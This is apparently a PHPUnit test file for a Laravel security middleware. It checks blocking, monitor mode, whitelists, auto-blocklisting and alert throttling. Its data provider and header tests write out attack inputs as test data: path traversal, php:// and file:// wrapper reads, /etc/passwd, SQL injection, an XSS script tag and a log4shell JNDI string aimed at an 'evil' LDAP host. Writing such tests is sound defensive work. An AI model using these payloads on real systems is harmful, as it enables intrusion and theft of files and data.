<?php

namespace Metalinked\LaravelDefender\Tests;

use Illuminate\Support\Facades\Event;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Route;
use Metalinked\LaravelDefender\Events\IpBlocked;
use Metalinked\LaravelDefender\Events\SuspiciousRequestDetected;
use Metalinked\LaravelDefender\Models\IpLog;
use Metalinked\LaravelDefender\Services\BlocklistService;
use PHPUnit\Framework\Attributes\DataProvider;

/**
 * The single `defender` middleware end to end: detection quality, monitor mode,
 * whitelist, responses, alert throttling.
 */
class DefenderMiddlewareTest extends TestCase {
    protected function setUp(): void {
        parent::setUp();

        Http::fake();

        Route::middleware('defender')->group(function () {
            Route::get('/page', fn () => 'ok');
            Route::post('/comment', fn () => 'saved');
            Route::get('/up', fn () => 'up');
        });
    }

    // --- Detection --------------------------------------------------------

    public function test_clean_request_passes(): void {
        $this->get('/page?q=laravel+security&page=2')->assertOk();
        $this->assertSame(0, IpLog::count());
    }

    #[DataProvider('attacks')]
    public function test_attack_in_query_string_is_blocked(string $query): void {
        $this->get('/page?' . $query)->assertForbidden();
    }

    public static function attacks(): array {
        return [
            'path traversal' => ['file=../../config/app.php'],
            'encoded traversal' => ['file=%2e%2e%2fconfig'],
            'double encoded traversal' => ['file=%252e%252e%252fconfig'],
            'php wrapper' => ['src=php://filter/resource=index'],
            'file wrapper' => ['src=file:///etc/hosts'],
            'passwd' => ['f=/etc/passwd'],
            'sqli with spaces' => ["id=1' UNION SELECT password FROM users--"],
            'sqli with plus' => ['id=1+union+all+select+1,2'],
            'sqli with comments' => ['id=1/**/UNION/**/SELECT/**/1'],
            'sqli tautology' => ["user=x' OR 1=1--"],
            'xss' => ['q=<script>alert(1)</script>'],
            'log4shell' => ['x=${jndi:ldap://evil/a}'],
        ];
    }

    public function test_attack_in_header_is_blocked(): void {
        $this->get('/page', ['X-Api-Version' => '${jndi:ldap://evil/a}'])->assertForbidden();
    }

    public function test_scanner_user_agent_is_blocked(): void {
        $this->get('/page', ['User-Agent' => 'sqlmap/1.7'])->assertForbidden();
    }

    public function test_generic_http_clients_are_not_blocked_by_default(): void {
        $this->get('/page', ['User-Agent' => 'curl/8.4.0'])->assertOk();
        $this->get('/page', ['User-Agent' => 'python-requests/2.31'])->assertOk();
    }

    #[DataProvider('legitimateContent')]
    public function test_legitimate_content_passes(array $body): void {
        $this->post('/comment', $body)->assertOk();
    }

    public static function legitimateContent(): array {
        return [
            'shell in prose' => [['body' => 'In a nutshell, I fixed it with PowerShell.']],
            'pasted image' => [['body' => '<p>Look:</p><img src="data:image/png;base64,iVBORw0KGgo=">']],
            'html comment' => [['body' => '<!-- draft --><p>Hello</p>']],
            'select in prose' => [['body' => 'Please select one option']],
            'password field' => [['password' => 'my passwd is long', 'email' => 'a@b.c']],
        ];
    }

    public function test_body_is_not_scanned_by_default(): void {
        $this->post('/comment', ['body' => '../../etc/hosts'])->assertOk();
    }

    public function test_body_is_scanned_when_enabled(): void {
        config(['defender.advanced_detection.scan_body' => true]);

        $this->post('/comment', ['body' => '../../etc/hosts'])->assertForbidden();
    }

    public function test_ignore_and_extra_patterns(): void {
        config([
            'defender.advanced_detection.ignore_patterns' => ['alert('],
            'defender.advanced_detection.extra_patterns' => ['evil-token'],
        ]);

        $this->get('/page?q=alert(1)')->assertOk();
        $this->get('/page?q=EVIL-TOKEN')->assertForbidden();
    }

    // --- Responses --------------------------------------------------------

    public function test_blocked_response_does_not_reveal_the_rule(): void {
        $response = $this->get('/page', ['User-Agent' => 'sqlmap/1.7']);

        $response->assertForbidden();
        $response->assertDontSee('sqlmap');
        $response->assertSee('Access denied.');
    }

    public function test_blocked_json_request_gets_json(): void {
        $this->getJson('/page?f=/etc/passwd')
            ->assertForbidden()
            ->assertExactJson(['message' => 'Access denied.']);
    }

    // --- Monitor mode -----------------------------------------------------

    public function test_monitor_mode_logs_but_never_blocks(): void {
        config(['defender.mode' => 'monitor', 'defender.auto_block.after' => 1]);
        Event::fake([IpBlocked::class]);

        $this->get('/page?f=/etc/passwd')->assertOk();
        $this->get('/page?f=/etc/passwd')->assertOk();

        $this->assertSame(2, IpLog::where('is_suspicious', true)->count());
        Event::assertNotDispatched(IpBlocked::class);
        $this->assertFalse(BlocklistService::isBlocked('127.0.0.1'));
    }

    // --- Whitelist --------------------------------------------------------

    public function test_whitelisted_ip_is_never_inspected(): void {
        config(['defender.whitelist.ips' => ['127.0.0.0/8']]);

        $this->get('/page?f=/etc/passwd')->assertOk();
        $this->assertSame(0, IpLog::count());
    }

    public function test_whitelisted_path_is_never_inspected(): void {
        config(['defender.whitelist.paths' => ['up']]);

        $this->get('/up', ['User-Agent' => 'sqlmap'])->assertOk();
        $this->get('/page', ['User-Agent' => 'sqlmap'])->assertForbidden();
    }

    // --- Escalation -------------------------------------------------------

    public function test_repeat_offender_ends_up_on_the_blocklist(): void {
        config(['defender.auto_block.after' => 3]);

        for ($i = 0; $i < 3; $i++) {
            $this->get('/page', ['User-Agent' => 'nikto'])->assertForbidden();
        }

        // Now even a clean request is refused, by the blocklist.
        $this->get('/page')->assertForbidden();
        $this->assertTrue(BlocklistService::isBlocked('127.0.0.1'));
    }

    // --- Alerts -----------------------------------------------------------

    public function test_notifications_are_throttled_per_ip(): void {
        config([
            'defender.alerts.channels' => ['database', 'webhook'],
            'defender.alerts.webhook.url' => 'https://hooks.example.com/defender',
            'defender.auto_block.after' => null,
        ]);

        for ($i = 0; $i < 10; $i++) {
            $this->get('/page', ['User-Agent' => 'nikto']);
        }

        Http::assertSentCount(1);
        $this->assertSame(10, IpLog::count(), 'the database still records every hit');
    }

    public function test_log_channel_never_receives_the_raw_request(): void {
        config(['defender.alerts.channels' => ['log']]);
        Log::spy();

        $this->withCookie('session', 'secret-session-id')->get('/page?f=/etc/passwd');

        Log::shouldHaveReceived('warning')->withArgs(function ($message, $context) {
            return ! array_key_exists('request', $context)
                && $context['ip'] === '127.0.0.1'
                && ! str_contains(json_encode($context), 'secret-session-id');
        });
    }

    public function test_suspicious_event_still_fires(): void {
        Event::fake([SuspiciousRequestDetected::class]);

        $this->get('/page', ['User-Agent' => 'nikto']);

        Event::assertDispatched(SuspiciousRequestDetected::class);
    }
}
